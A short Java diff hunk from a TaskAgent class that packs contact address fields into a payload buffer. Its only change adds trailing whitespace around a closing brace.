@@ -251,8 +251,8 @@ public final class TaskAgent extends Agent implements PIMListListener {
                 addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x2F);
 
             }
-        }
-
+        }       
+        
         int size = dbPayload.getLength() + header.length;
         //#ifdef DEBUG_TRACE
         debug.trace("payload len: " + dbPayload.getLength());
